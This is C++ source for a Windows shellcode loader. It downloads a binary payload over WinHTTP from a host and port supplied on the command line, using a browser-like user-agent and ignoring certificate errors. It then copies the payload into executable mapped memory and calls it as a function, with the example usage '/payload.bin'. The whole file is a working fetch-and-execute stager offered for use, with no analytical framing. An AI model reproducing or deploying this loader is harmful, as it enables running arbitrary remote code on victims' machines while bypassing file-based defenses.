#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
#include <winhttp.h>
#include "Winternl.h"
#include <iostream>
#include <string>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "ntdll")
unsigned char buf[999999999];
void dl(const wchar_t* host, short port, const wchar_t* endpoint, bool isSSL)
{
	int counter = 0;
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	// Use WinHttpOpen to obtain a session handle.
	hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	// Specify an HTTP server.
	if (hSession)
		hConnect = WinHttpConnect(hSession, (LPCWSTR)host, port, 0);
	DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
	// Create an HTTP request handle.
	if (hConnect)
		if (isSSL == true) {
			hRequest = WinHttpOpenRequest(hConnect, L"GET", endpoint, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
		}
		else {
			hRequest = WinHttpOpenRequest(hConnect, L"GET", endpoint, L"HTTP/1.1", WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
		}
	// This is for accepting self signed Cert
	if (!WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags)))
	{
		exit(443);
	}
	// Send a request.
	if (hRequest)
		bResults = WinHttpSendRequest(hRequest,
			WINHTTP_NO_ADDITIONAL_HEADERS,
			0, WINHTTP_NO_REQUEST_DATA, 0,
			0, 0);
	// End the request.
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);
	// Keep checking for data until there is nothing left.
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
			{
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
				break;
			}
			// No more available data.
			if (!dwSize)
				break;
			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				break;
			}
			// Read the Data.
			ZeroMemory(pszOutBuffer, dwSize + 1);
			if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
				dwSize, &dwDownloaded))
			{
				printf("Error %u in WinHttpReadData.\n", GetLastError());
			}
			else
			{
				int i = 0;
				while (i < dwSize)
				{
					// Since the cunks are transferred in 8192 bytes, this check is required for larger buffers
					if (counter >= sizeof(buf))
					{
						break;
					}
					memcpy(&buf[counter], &pszOutBuffer[i], sizeof(char));

					//printf("i:%d | dwSize:%d | Counter:%d | buf char:%c | psz char: %c\n", i, dwSize, counter, buf[counter], pszOutBuffer[i]);
					counter++;
					i++;
				}
			}
			// Free the memory allocated to the buffer.
			delete[] pszOutBuffer;

			// This condition should never be reached since WinHttpQueryDataAvailable
			// reported that there are bits to read.
			if (!dwDownloaded)
				break;

		} while (dwSize > 0);
		printf("[+] Payload loaded into memory!\n");
	}
	else
	{
		// Report any errors.
		printf("Error %d has occurred.\n", GetLastError());
	}
	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
}
int main(int argc, char* argv[])
{
	//Arguments
	if (argc != 5)
	{
		std::cout << "Usage: <Hostname/IP> <Port> <Endpoint> <IsSSL (true/false)>\nExample: 192.168.1.1 80 /payload.bin false" << std::endl;
		return 1;
	}
	const char* url = argv[1];
	short port = std::stoi(argv[2]);
	const char* endpoint = argv[3];
	bool isSSL = (std::string(argv[4]) == "true");
	// Convert char* to wchar_t* for WinHTTP functions
	wchar_t host[256];
	size_t convertedChars = 0;
	mbstowcs_s(&convertedChars, host, sizeof(host), url, _TRUNCATE);
	wchar_t ep[256];
	mbstowcs_s(&convertedChars, ep, sizeof(ep), endpoint, _TRUNCATE);
	//Request
	dl(host, port, ep, isSSL);
	//Run code
	HANDLE mem_handle = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, sizeof(buf), NULL);
	void* mem_map = MapViewOfFile(mem_handle, FILE_MAP_ALL_ACCESS | FILE_MAP_EXECUTE, 0x0, 0x0, sizeof(buf));
	std::memcpy(mem_map, buf, sizeof(buf));
	std::cout << ((int(*)())mem_map)() << std::endl;
	return 0;
}